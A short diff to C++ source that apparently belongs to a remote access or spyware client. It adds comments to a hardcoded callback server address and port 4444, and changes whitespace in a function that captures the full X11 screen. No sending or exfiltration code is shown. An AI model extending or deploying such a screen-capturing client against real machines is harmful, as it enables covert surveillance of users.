@@ -35,8 +35,8 @@ Done:
 
 ///---------------[ Library ]---------------\\\
 
-#define g_szIP "127.0.0.1"
-#define g_nPort 4444
+#define g_szIP "127.0.0.1" //Server IP
+#define g_nPort 4444 //Server Port
 
 using namespace std;
 
@@ -103,5 +103,5 @@ void fnScreenshot()
     Window root = DefaultRootWindow(display);
     XImage *img = XGetImage(display, root, 0, 0, 1920, 1080, AllPlanes, ZPixmap);
 
-
+    
 }
